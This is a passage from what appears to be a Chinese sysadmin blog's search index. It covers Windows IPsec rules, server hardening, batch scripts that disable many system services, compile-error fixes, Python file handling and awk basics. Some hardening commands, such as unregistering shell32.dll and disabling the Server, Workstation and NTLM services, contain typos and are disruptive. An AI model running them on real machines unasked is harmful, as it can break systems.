add filter filterlist=80port srcaddr=me dstaddr=any dstport=25 protocol=TCP description=\"允许本机访问其他服务器25\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=110 protocol=TCP description=\"允许本机访问其他服务器的110端口，110端口是为POP3（邮件协议3）服务开放的\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=143 protocol=TCP description=\"允许本机访问其他服务器143端口，143端口主要是用于IMAP）\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=465 protocol=TCP description=\"允许本机访问其他服务器465端口，465端口是为SMTPS(SMTP-over-SSL)协议服务开放的\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=995 protocol=TCP description=\"允许本机访问其他服务器995端口，995端口是为POP3S(POP3-over-SSL)协议服务开放的\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=993 protocol=TCP description=\"允许本机访问其他服务器993端口，993端口是为IMAPS(IMAP-over-SSL)协议服务开放的\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=123 protocol=UDP description=\"windows时间更新\" ::netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=123 protocol=TCP description=\"windows时间更新\" netsh ipsec static add rule name=80port policy=我的规则 filterlist=80port filteraction=Permit :: 建立信任IP规则 netsh ipsec static add filterlist name=AllowIP description=\"信任IP\" :: ############### 此处添加 远程信任的访问IP ############### ::公司网络出口ip :: netsh ipsec static add filter filterlist=AllowIP srcaddr=xx.xx.xx.xx srcmask=255.255.255.255 dstaddr=me description=\"公司网络出口ip\" ::-----------------------------------其他外网服务器------------------------- ::VPN服务器 :: netsh ipsec static add filter filterlist=AllowIP srcaddr=xx.xx.xx.xx dstaddr=me description=\"中转服务器\" netsh ipsec static add rule name=AllowIP policy=我的规则 filterlist=AllowIP filteraction=Permit :: 建立一条拒绝所有IP访问规则 netsh ipsec static add filterlist name=DenyIP description=\"拒绝所有IP\" ::拒绝所有IP地址访问本机--进限制 net","date":"2022-06-24","objectID":"/posts/scripts/bat/ipsec/:0:0","tags":["bat","ipsec","windows","scripts"],"title":"windows 本地安全策略设置","uri":"/posts/scripts/bat/ipsec/"},{"categories":["windows","运维记事"],"content":"安装优化","date":"2022-06-24","objectID":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/","tags":["windows"],"title":"windows安装优化","uri":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/"},{"categories":["windows","运维记事"],"content":"1. 系统安全 显示电脑图标到桌面: rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,0 开始文件夹: shell:startup 本地安全策略: secpol.msc 计算机管理: compmgmt.msc 1.1. 修改服务器名：按项目取名。 右键点击我的电脑-高级-计算机名-更改。英文: my computer - proterties - Advanced system settings - Computer Name - Change 1.2. 调整性能设置： 右键点击我的电脑-高级-性能中，选中“设置为最佳性能”英文: my computer - proterties-Advanced - Performance-setting -Visual Effects (Adjust for best performance)； 数据执行保护设置为“只为关键的windows程序保护”。 1.3. 允许 dump file 的产生： 右键点击我的电脑-高级-启动和故障恢复-写入调试信息 设置成“最小化记录模式”。英文版操作：右击 My Computer-Advanced-Startup and recovery-write debugging infomation设置成“small…”。 1.4. 禁用 NETBOIS: 网络连接属性-tcpip 属性-高级-wins-NetBios 设置 “禁用 Tcp/ip 上的 NetBios”选项 1.5. 禁止设置网卡为 Disable 运行gpedit.msc- 用户配置-管理模板-网络-网络连接下的\"启用/禁用 LAN 链接的能力(Ability to Enable/Disable a LAN connection)“设置为Disabled 设置\"为管理员启用windows2000网路连接设置(Enable Windows2000 Network Connections settings for Administrators)” 选项为Enabled 1.6. IIS 安装后修改站点日志目录 2. 用户安全 netplwiz用户名修改,安全策略里面也有设置方法 禁用Guest账号(设置复杂密码) 限制不必要的用户(如aspnet,sqldebugger等) 把系统Administrator账号改名 创建名称为Administrator陷阱用户 (正确设置描述信息,不给任何权限) 建立一个备用管理员帐户。 不让系统显示上次登录的用户名(后面本地策略中有) 通过reg脚本设置开机前 5 分钟自动登录 3. 本地安全策略设置 3.1. 本地安全策略设置 gpedit.msc-计算机配置-windows设置-安全设置 本地策略-审核策略 推荐的要审核的项目是： 策略更改 成功 失败 登录事件 成功 失败 对象访问 失败 过程追踪 无 目录服务访问 失败 特权使用 失败 系统事件 成功 失败 账户登录事件 成功 失败 账户管理 无 英文版： Audit account logon events Success,Failure Audit account management No auditing Audit directory service access Failure Audit logon event Success,Failure Audit object access Failure Audit polic change Success,Failure Audit privilege use Failure Audit process tracking No auditing Audit system events Success,Failure 本地策略—\u003e用户权限分配 关闭系统(shut down the system)： 只有Administrators组、其它全部删除。 通过终端服务允许登陆(Allow log on through Terminal services)： 只加入Administrators,Remote Desktop Users组，其他全部删除。 C、本地策略——\u003e安全选项 交互式登陆：不显示上次的用户名　启用 网络访问：不允许SAM帐户和共享的匿名枚举　启用 网络访问：不允许为网络身份验证储存凭证　启用 网络访问：可匿名访问的共享　全部删除 网络访问：可匿名访问的命名管道　全部删除 网络访问：可远程访问的注册表路径　全部删除 网络访问：可远程访问的注册表路径和子路径　全部删除 帐户：重命名系统管理员帐户　重命名一个帐户（比如administrator改成lefux,不一定是lefux问清楚再改，改后最好重启一下服务器） 英文版本： Interactive logon: Do not display last user name Enabled Network access: Do not allow anonymous enumeration of SAM accounts and share Enabled Network access: Do not allow storage of passwords and credentials for network authentication Enabled Network access: Named Pipes that can be accessed anonymously 全删除 Network access: Remotely accessible registry paths 全删除 Network access: Remotely accessible registry paths and subpaths 全删除 Network access: Shares that can be accessed anonymously 全删除 4. 禁用以下的服务 Computer Browser；Portable Media Serial Number Service Distributed File System; Windows Audio; Alert Distributed linktracking client： Error reporting service： FTP Publishing Service Messenger Indexing Service Microsoft Serch： NT LM Security support provide： server PrintSpooler： Remote Desktop Help Session Manager： Remote Registry; Routing and Remote Access Workstation (美国服务器不要关) 经测试可以关闭的其他服务也可以关 ","date":"2022-06-24","objectID":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/:0:0","tags":["windows"],"title":"windows安装优化","uri":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/"},{"categories":["windows","运维记事"],"content":"命令收集","date":"2022-06-24","objectID":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/","tags":["windows"],"title":"Windows命令收集","uri":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["windows","运维记事"],"content":"1. windows 服务安装卸载 :: 注意空格 sc create \"Memcached_11233\" start= auto binPath= \"D:\\box\\memcached\\memcached.exe -d runservice -m 128 -c 512 -p 11233 -l 127.0.0.1\" DisplayName= \"Memcached_11233\" ---- sc delete Memcached_11233 2. 删除windows\\temp 5天前以sess*开头的文件 forfiles /p \"C:\\Windows\\Temp\" /s /d -5 /m sess* /c \"cmd /c del /f /q /s @path\" 3. windows 端口转发 :: 转发不生效需先安装 ipv6 C:\\\u003e netsh interface ipv6 install :: 转发本机ip端口 到其他服务器ip端口 :: netsh interface portproxy add v4tov4 listenaddress=[外网IP] listenport=[外网端口] connectaddress=[内网IP] connectport=[内网端口] C:\\\u003e netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=10055 connectaddress=10.42.0.58 connectport=10050 :: 查看已设置的转发 C:\\\u003e netsh interface portproxy show all :: 删除端口转发 :: netsh interface portproxy delete v4tov4 listenaddress=[外网IP] listenport=[外网端口] C:\\\u003e netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=10055 4. 修改ntp同步频率 regedit: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpClient\\SpecialPollInterval 900=15分钟 3600=1小时 默认: 604800是由7(天)×24(时)×60(分)×60(秒) 5. windows mysql 备份 @echo off title mysql-client set \"Ymd=%date:~,4%%date:~5,2%%date:~8,2%\" echo %Ymd% C: \"D:\\xx\\mysqldump.exe\" -h\u003cip\u003e -P\u003cport\u003e -u\u003cuser\u003e -p\u003cpasswrod\u003e -R \u003c数据库名称\u003e \u003e D:\\DatabaseBak\\xxx_%Ymd%.sql 6. 查看80端口连接数 netstat -an -p tcp | find /c \"80\" 7. windows 时间获取方式 :: 编码格式 ANSI :: 脚本创建时最好选择ANSI编码(防止中文乱码) :: @echo off 表示不回显执行的命令 @echo off @echo =========Windows的原本日期时间格式======================= :: 设置变量，使用变量时需要用一对%包起来 set ORIGINAL_DATE=%date% echo %ORIGINAL_DATE% @echo =========日期按照YYYY-MM-DD格式显示====================== :: 日期截取遵从格式 %date:~x,y%，表示从第x位开始，截取y个长度(x,y的起始值为0) :: 年份从第0位开始截取4位，月份从第5位开始截取2位，日期从第8位开始截取2位 set YEAR=%date:~0,4% set MONTH=%date:~5,2% set DAY=%date:~8,2% set CURRENT_DATE=%YEAR%-%MONTH%-%DAY% echo %CURRENT_DATE% @echo =========时间按照HH:MM:SS格式显示======================== :: 时间截取遵从格式 %time:~x,y%，表示从第x位开始，截取y个长度(x,y的起始值为0) :: 时钟从第0位开始截取2位，分钟从第3位开始截取2位，秒钟从第6位开始截取2位 set HOUR=%time:~0,2% set MINUTE=%time:~3,2% set SECOND=%time:~6,2% :: 当时钟小于等于9时,前面有个空格，这时我们少截取一位，从第1位开始截取 set TMP_HOUR=%time:~1,1% set NINE=9 set ZERO=0 :: 处理时钟是个位数的时候前面补上一个0, LEQ表示小于等于https://www.coder.work/article/6503907 if %HOUR% LEQ %NINE% set HOUR=%ZERO%%TMP_HOUR% set CURRENT_TIME=%HOUR%:%MINUTE%:%SECOND% echo %CURRENT_TIME% @echo =========日期时间按照YYYY-MM-DD HH:MM:SS格式显示========= set CURRENT_DATE_TIME=%YEAR%-%MONTH%-%DAY% %HOUR%:%MINUTE%:%SECOND% echo %CURRENT_DATE_TIME% @echo =========日期时间按照YYYYMMDD_HHMMSS格式显示============= set CURRENT_DATE_TIME_STAMP=%YEAR%%MONTH%%DAY%_%HOUR%%MINUTE%%SECOND% echo %CURRENT_DATE_TIME_STAMP% @echo ========================================================= pause 8. 按照时间创建文件夹 :: 编码格式 ANSI :: 脚本创建时最好选择ANSI编码(防止中文乱码) :: @echo off 表示不回显执行的命令 @echo off :: 日期截取遵从格式 %date:~x,y%，表示从第x位开始，截取y个长度(x,y的起始值为0) :: 年份从第0位开始截取4位，月份从第5位开始截取2位，日期从第8位开始截取2位 set YEAR=%date:~0,4% set MONTH=%date:~5,2% set DAY=%date:~8,2% :: 时间截取遵从格式 %time:~x,y%，表示从第x位开始，截取y个长度(x,y的起始值为0) :: 时钟从第0位开始截取2位，分钟从第3位开始截取2位，秒钟从第6位开始截取2位 set HOUR=%time:~0,2% set MINUTE=%time:~3,2% set SECOND=%time:~6,2% :: 毫秒 set MILLISECIOND=%time:~9,2% :: 当时钟小于等于9时,前面有个空格，这时我们少截取一位，从第1位开始截取 set TMP_HOUR=%time:~1,1% set NINE=9 set ZERO=0 :: 处理时钟是个位数的时候前面补上一个0, LEQ表示小于等于 if %HOUR% LEQ %NINE% set HOUR=%ZERO%%TMP_HOUR% set CURRENT_DATE_TIME_STAMP=%YEAR%%MONTH%%DAY%%HOUR%%MINUTE%%SECOND%%MILLISECIOND% mkdir %CURRENT_DATE_TIME_STAMP% 9. windows前台程序运行到后台 ' 运行到后台 ' start.vbs Set ws = CreateObject(\"Wscript.Shell\") ws.run \"example.exe\",vbhide ' ' 程序关闭 ' stop.vbs Dim Wsh Set Wsh = WScript.CreateObject(\"WScript.Shell\") Wsh.Run \"taskkill /f /im example.exe\",0 Set Wsh=NoThing WScript.quit ","date":"2022-06-24","objectID":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:0:0","tags":["windows"],"title":"Windows命令收集","uri":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["那些年的收藏"],"content":"本地安全策略","date":"2022-06-24","objectID":"/posts/scripts/bat/%E6%9C%AC%E5%9C%B0%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/","tags":["bat","windows","scripts","优化"],"title":"本地安全策略-安全选项","uri":"/posts/scripts/bat/%E6%9C%AC%E5%9C%B0%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/"},{"categories":["那些年的收藏"],"content":" ::本地安全策略--安全选项---需重启生效 ::安全选项 ::网络访问：可远程访问的注册表路径　reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg\\AllowedPaths\" /v Machine /t REG_MULTI_SZ /f ::网络访问：可远程访问的注册表路径和子路径 reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg\\AllowedExactPaths\" /v Machine /t REG_MULTI_SZ /f ::网络访问：可匿名访问的共享 reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters\" /v NullSessionShares /t REG_MULTI_SZ /f ::网络访问：可匿名访问的命名管道 reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters\" /v NullSessionPipes /t REG_MULTI_SZ /f ::网络访问：不允许SAM帐户和共享的匿名枚举　reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa” /v restrictanonymous /t REG_DWORD /d 1 /f ::网络访问：不允许为网络身份验证储存凭证或.net passports reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"disabledomaincreds\" /t reg_dword /d 1 /f ::交互式登陆：不显示上次的用户名 reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\" /v \"dontdisplaylastusername\" /t reg_dword /d 1 /f ::交互式登陆：会话锁定时显示用户信息 reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\" /v \"legalnoticetext\" /t reg_sz /d 不显示用户信息 /f ::重命名来宾用户 ::wmic useraccountame='guest' call Rename xxxgudsadsest net user guest /active:no wmic useraccount where name='guest' call Rename xxxgudsadsest ::禁用aspnet用户 net user aspnet /active:no ::删除不安全组件 regsvr32 /u wshom.ocx regsvr32 /u shell32.dll reg add \"HKEY_CURRENT_USER\\Control Panel\\International\" /v sDate /t REG_SZ /d - /f reg add \"HKEY_CURRENT_USER\\Control Panel\\International\" /v sShortDate /t REG_SZ /d yyyy-MM-dd /f reg add \"HKEY_CURRENT_USER\\Control Panel\\International\" /v sTime /t REG_SZ /d : /f reg add \"HKEY_CURRENT_USER\\Control Panel\\International\" /v sTimeFormat /t REG_SZ /d H:mm:ss /f ","date":"2022-06-24","objectID":"/posts/scripts/bat/%E6%9C%AC%E5%9C%B0%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/:0:0","tags":["bat","windows","scripts","优化"],"title":"本地安全策略-安全选项","uri":"/posts/scripts/bat/%E6%9C%AC%E5%9C%B0%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/"},{"categories":["那些年的收藏"],"content":"关闭短文建生成注册","date":"2022-06-24","objectID":"/posts/scripts/bat/%E5%85%B3%E9%97%AD%E7%9F%AD%E6%96%87%E5%BB%BA%E7%94%9F%E6%88%90%E6%B3%A8%E5%86%8C/","tags":["bat","windows","scripts"],"title":"关闭短文建生成注册","uri":"/posts/scripts/bat/%E5%85%B3%E9%97%AD%E7%9F%AD%E6%96%87%E5%BB%BA%E7%94%9F%E6%88%90%E6%B3%A8%E5%86%8C/"},{"categories":["那些年的收藏"],"content":" Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\FileSystem] \"NtfsDisable8dot3NameCreation\"=dword:00000001 ","date":"2022-06-24","objectID":"/posts/scripts/bat/%E5%85%B3%E9%97%AD%E7%9F%AD%E6%96%87%E5%BB%BA%E7%94%9F%E6%88%90%E6%B3%A8%E5%86%8C/:0:0","tags":["bat","windows","scripts"],"title":"关闭短文建生成注册","uri":"/posts/scripts/bat/%E5%85%B3%E9%97%AD%E7%9F%AD%E6%96%87%E5%BB%BA%E7%94%9F%E6%88%90%E6%B3%A8%E5%86%8C/"},{"categories":["那些年的收藏"],"content":"禁止windows服务","date":"2022-06-24","objectID":"/posts/scripts/bat/%E7%A6%81%E6%AD%A2windows%E6%9C%8D%E5%8A%A1/","tags":["bat","windows","scripts"],"title":"禁止windows服务","uri":"/posts/scripts/bat/%E7%A6%81%E6%AD%A2windows%E6%9C%8D%E5%8A%A1/"},{"categories":["那些年的收藏"],"content":" @echo off color 0A title ############ 禁用并停止系统服务 ############### echo ############ start 禁用并停止系统服务 ############### pause echo 正在禁用Computer Browser服务 net stop Browser sc config Browser start= disabled echo 正在禁用Distributed File System服务 net stop Dfs sc config Dfs start= disalbed echo 正在禁用Distributed File System服务 net stop Dfs sc config Dfs start= disabled echo 正在禁用Distributed linktracking client服务 net stop TrkWks sc config TrkWks start= disabled echo 正在禁用Error reporting service服务 net stop ERSvc sc config ERSvc start= disabled echo 正在禁用Messenger 服务 net stop Messenger sc config Messenger start= disabled echo 正在禁用Windows Audio服务 net stop AudioSrv sc config AudioSrv start= disabled echo 正在禁用Alerter服务 net stop Alerter sc config Alerter start= disabled echo 正在禁用Help and Support 服务 net stop helpsvc sc config helpsvc= disabled echo 正在禁用Indexing Service 服务 net stop CiSvc sc config CiSvc start= disabled echo 正在禁用FTP Publishing Service服务 net stop MSFtpsvc sc config MSFtpsvc start= disabled echo 正在禁用Microsoft Serch服务 net stop MSSEARCH sc config MSSEARCH start= disabled echo 正在禁用NT LM Security support provide服务 net stop NtLmSsp sc config NtLmSsp start= disabled echo 正在禁用Portable Media Serial Number Service服务 net stop WmdmPmSN sc config WmdmPmSN start= disabled echo 正在禁用Print Spooler服务 net stop Spooler sc config Spooler start= disabled echo 正在禁用Remote Desktop Help Session Manager服务 net stop RDSessMgr sc config RDSessMgr start= disabled echo 正在禁用Remote Registry服务 net stop RemoteRegistry sc config RemoteRegistry start= disabled echo 正在禁用server服务 net stop lanmanserver sc config lanmanserver start= disabled pause echo 下面将禁用Workstation服务,美国服务器请选择N,国内选择Y echo 正在禁用Workstation服务 net stop lanmanworkstation sc config lanmanworkstation start= disabled echo 正在禁用Routing and Remote Access服务 net stop RemoteAccess sc config RemoteAccess start= disabled echo 正在禁用Help and Support服务 net stop helpsvc sc config helpsvc start= disabled echo 正在禁用FTP Publishing Service服务 net stop MSFTPSVC sc config MSFTPSVC start= disabled echo 正在禁用SNMP Service服务 net stop SNMP sc config SNMP= disabled echo 禁用coldfusion9相关服务 echo 正在禁用ColdFusion 9 .NET Service服务 net stop \"ColdFusion 9 .NET Service\" sc config \"ColdFusion 9 .NET Service\" start= disabled echo 正在禁用ColdFusion 9 ODBC Agent服务 net stop \"ColdFusion 9 ODBC Agent\" sc config \"ColdFusion 9 ODBC Agent\" start= disabled echo 正在禁用\"ColdFusion 9 ODBC Server\"服务 net stop \"ColdFusion 9 ODBC Server\" sc config \"ColdFusion 9 ODBC Server\" start= disabled echo 正在禁用ColdFusion 9 Solr Service服务 net stop CF9solr sc config CF9solr start= disabled echo 正在禁用ColdFusion 9 Search Server服务 net stop \"ColdFusion 9 Search Server\" sc config \"ColdFusion 9 Search Server\" start= disabled echo 禁用sql2008相关服务 echo 正在禁用SQL Server Integration Services 10.0服务 net stop MsDtsServer100 sc config MsDtsServer100 start= disabled echo 正在禁用SQL Active Directory Helper Service服务 net stop MSSQLServerADHelper100 sc config MSSQLServerADHelper100 start= disabled echo 正在禁用SQL Server Browser服务 net stop SQLBrowser sc config SQLBrowser start= disabled echo 正在禁用SQL Server VSS Writer服务 net stop SQLWriter sc config SQLWriter start= disabled ","date":"2022-06-24","objectID":"/posts/scripts/bat/%E7%A6%81%E6%AD%A2windows%E6%9C%8D%E5%8A%A1/:0:0","tags":["bat","windows","scripts"],"title":"禁止windows服务","uri":"/posts/scripts/bat/%E7%A6%81%E6%AD%A2windows%E6%9C%8D%E5%8A%A1/"},{"categories":["linux","运维记事"],"content":"那些编译时出现的杂七杂八故障","date":"2022-06-24","objectID":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/","tags":["linux","解决方案"],"title":"那些编译时出现的杂七杂八故障","uri":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/"},{"categories":["linux","运维记事"],"content":"1. ossec 3.3.0 编译故障 及服务端启动故障 ## 全部依赖 yum install zlib-devel pcre2-devel make gcc sqlite-devel openssl-devel libevent-devel systemd-devel ## 下载 https://ftp.pcre.org/pub/pcre/pcre2-10.32.tar.gz 解压到 src/external 中 或者安装 pcre2-devel ## 另 编译需要依赖 openssl-devel 等额外包 Makefile:766: recipe for target 'external/pcre2-10.32/install/lib/libpcre2-8.a' failed make: *** [external/pcre2-10.32/install/lib/libpcre2-8.a] Error 2 # server mysql 故障（ossec.conf配置myslq相关参数后无效） ossec-dbd(5207): ERROR: OSSEC not compiled with support for 'mysql'. ossec-dbd(1202): ERROR: Configuration error at '/data/software/ossec-server/etc/ossec.conf'. Exiting. # 安装前需要启用mysql支持（实验版本: 3.6） export DATABASE=mysql export TARGET=server export USE_GEOIP=1 # client-agent/start_agent.c:15:19: fatal error: event.h: No such file or directory # 需要安装 yum install -y libevent-devel 2. rsync 同步故障 @ERROR: auth failed on module # 出现此问题的原因可能有两个 # 1. 指定的认证文件 权限非 600 # 2. 指定认证文件行末尾存在注释(别问我怎么知道的,我不想说!) 3. python 3.7.x zipimport.ZipImportError: can’t decompress data; zlib not available yum -y install zlib-devel 4. python 3.7.x ModuleNotFoundError: No module named ‘_ctypes’ yum install libffi-devel -y # libffi-devel-3.0.13-18.el7.x86_64.rpm 5. python 3.7.x ‘SSLError(“Can’t connect to HTTPS URL because the SSL module is not available.”)’ # Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\")': /simple/request/ # 先安装，在加上`--with-ssl`编译安装，可加上--enable-optimizations ，让python运行得更快 yum install openssl-devel -y 6. python 3.x ’errors like : “Could not import runpy module”, operations as following:' # 1. gcc 需要升级到8.x + # 2. 取消 --enable-optimizations 参数 # 另: python 3.x 编译需要依赖openssl 1.1.1 ./config --prefix=/pathto/openssl \u0026\u0026 make \u0026\u0026 make install 7. python 3.x ‘ModuleNotFoundError: No module named ‘_bz2’’ yum install bzip2-devel -y 8. python 3.x ‘ModuleNotFoundError: No module named ‘_lzma’’ sudo yum install xz-devel ","date":"2022-06-24","objectID":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/:0:0","tags":["linux","解决方案"],"title":"那些编译时出现的杂七杂八故障","uri":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/"},{"categories":["linux","运维记事"],"content":"文件操作","date":"2022-06-24","objectID":"/posts/python/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/","tags":["linux","python"],"title":"文件操作","uri":"/posts/python/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"1. 文件操作 文件读取指针概念 当python 使用open().read()读取文件时,是按行从上向下读取,当他读取一行时,会给那行设置一个下标(个人理解)来标注当前读取到那行了,在向下读取过程中,下标逐步增加,直至到最后一行,这个下标即为指针. 模式说明 标识符 描述 文件要求 r 只读模式, 只允许读取文件内容 文件必须存在 r+ 读写模式, 可读可写,不分先后,但写入只能写入到末尾行 文件必须存在 b 二进制操作模式,使用场景一般文操作流文件 - w 新建模式, 写入新的文件内容 若存在文件,清空文件内容,不存在新建 w+ 写读模式, 可以边写边读,读是从实际的指针位置开始,可指定指针到开头读取写入内容 存在文件,清空文件内容,不存在新建 a 追加模式, 可写但不允许读,只允许从最后一行开始追加 存在直接操作,不存在新建 a+ 追加读模式, 可读可写,写只能写入到末尾行 存在直接操作,不存在新建 U 表示在读取文件时候,将\\r\\n统一转成\\n, 使用场景一般是在linux上读取win的文件 - 1.1. 基础语法 # 打开为文件对象, 默认 mode = \"r\", encoding=\"系统编码\" f = open(\"file.md\") # 读取文件内容 data = f.read() f1 = open(\"file1.md\",\"w\",encoding=\"utf-8\") # 写入内容到文件 f1.write(\"hello python\") f2 = open(\"file1.md\",\"a\",encoding=\"utf-8\") f2.write(\"hello python2\") # 文件流关闭 在持续执行程序中必须在文件操作完毕后进行关闭 f.close() 1.2. 常规操作 f = open(\"file1.md\",\"r\",encoding=\"utf-8\") # 打印一行 并将指针向下偏移一次 print(f.readline()) # 读取所有行类容,将其转换为以\\n为结尾的列表,使用循环遍历每一行 print(f.readlines()) # 打印已读取的光标位置(列)从0开始,字符读取,字节计数(末尾\\n) print(f.tell()) # 读取3个字符 print(f.read(3)) # 设置上一读取行指针位置 f.seek(2) #打印文件编码 print(f.encoding) # 判断文件是否是一个可读取的文件 print(f.seekable()) # 在文件写入后,清空缓存区内容到文件当中 f.flush() # 在文件的追加模式下,从文件开头(0指针)位置开始截断并重新写入指定长度的字符串 f.truncate(6) 1.3. 文件读取 with语句 with open(\"file1.md\",\"r\",encoding=\"utf-8\") as f: for line in f: print(line) # with 语句也可以同时打开多个文件 with open(\"file1.md\",\"r\",encoding=\"utf-8\") as f1,\\ open(\"file2.md\",\"r\",encoding=\"utf-8\") as f2: print(f1.readlines()) print(f2.readlines()) ","date":"2022-06-24","objectID":"/posts/python/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:0:0","tags":["linux","python"],"title":"文件操作","uri":"/posts/python/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"AWK常用","date":"2022-06-23","objectID":"/posts/linux/awk%E5%B8%B8%E7%94%A8/","tags":["linux","awk"],"title":"AWK常用(半草稿)","uri":"/posts/linux/awk%E5%B8%B8%E7%94%A8/"},{"categories":["linux","运维记事"],"content":" https://awk.readthedocs.io/en/latest/chapter-one.html 1. 摘要 awk ' BEGIN{ 语句 } statements2 {语句} END{ 语句 } ' BEGIN { 语句 }：在读取任何输入前执行一次 语句 END { 语句 }：读取所有输入之后执行一次 语句 表达式 { 语句 }： 对于 表达式 为真（即，非零或非空）的行，执行 语句 /正则表达式/ { 语句 }： 如果输入行包含字符串与 正则表达式 相匹配，则执行 语句 组合模式 { 语句 }： 一个 组合模式 通过与（\u0026\u0026），或（||），非（|），以及括弧来组合多个表达式；对于组合模式为真的每个输入行，执行 语句 模式1，模式2 { 语句 }： 范围模式(range pattern)匹配从与 模式1 相匹配的行到与 模式2 相匹配的行（包含该行）之间的所有行，对于这些输入行，执行 语句 。 BEGIN和END不与其他模式组合。范围模式不可以是任何其他模式的一部分。BEGIN和END是仅有的必须搭配动作的模式。 2. awk 变量 $n: 分割后，第n列的字段 ${1..n} 代表当前行的1-n的列值 $0: 代表整行的数据 FS: 表示使用的列的分割符(默认空格,位于BEGIN模块,命令行中-F指定) OFS: 输出列的分割符,默认print $1,$2的时候中间的,代表空格(默认),可使用OFS进行更改,位于BEGIN模块当中 NF: 分割后，当前行一共多少个字段($NF最后一列,$(NF-1)倒数第2列) NR: 记录行号,表示当前正在处理的记录的行的号码 FNR: 各文件分别计数的行号 RS: 表示行分隔符,表示每个记录输入的时候的分割符,即行与行是如何分割的(内置变量RS用来存放输入的记录分割符,可通过BEGIN模块来进行修改,支持正则表达式 ORS: 输出记录分隔符(输出换行符)，输出时用指定符号代替换行符,默认行的分割符为\\n FILENAME: 当前文件名 ARGC：命令行参数的个数 ARGV: 数组，命令行参数的值 示例 RS: 表示行分隔符,表示每个记录输入的时候的分割符,即行与行是如何分割的(内置变量RS用来存放输入的记录分割符,可通过BEGIN模块来进行修改,支持正则表达式 示例 1 : [root@00 ~]# head -2 /etc/passwd|awk 'BEGIN{RS=\":\"}{print NR,$0}' ### root:x:0:0:root:/root:/bin/bash ### ### bin:x:1:1:bin:/bin:/sbin/nologin ### 1 root 2 x 3 0 4 0 5 root 6 /root 7 /bin/bash # \u003c\u003c=== 此处本身包含一个换行符 bin 8 x 9 1 10 1 11 bin 12 /bin 13 /sbin/nologin 示例 2 : [root@00 ~]# head -n 3 /etc/passwd|awk 'BEGIN{RS=\"[:/0-9]+|\\n\"}{print $0}' |sort|uniq -c ### root:x:0:0:root:/root:/bin/bash ### ### bin:x:1:1:bin:/bin:/sbin/nologin ### ### daemon:x:2:2:daemon:/sbin:/sbin/nologin ### 1 bash 4 bin 2 daemon 2 nologin 3 root 3 sbin 3 x FS: 输入分割符，命令处理参数使用-F指定分割符,或者使用变量形式修改 示例: $\u003e awk -F \":\" 'NR==12,NR==15{print NR,$1,$3}' pwd.txt 12 ftp 14 13 nobody 65534 14 systemd-coredump 999 15 systemd-network 192 $\u003e awk -v FS=\":\" 'NR==12,NR==15{print NR,$1,$3}' pwd.txt 12 ftp 14 13 nobody 65534 14 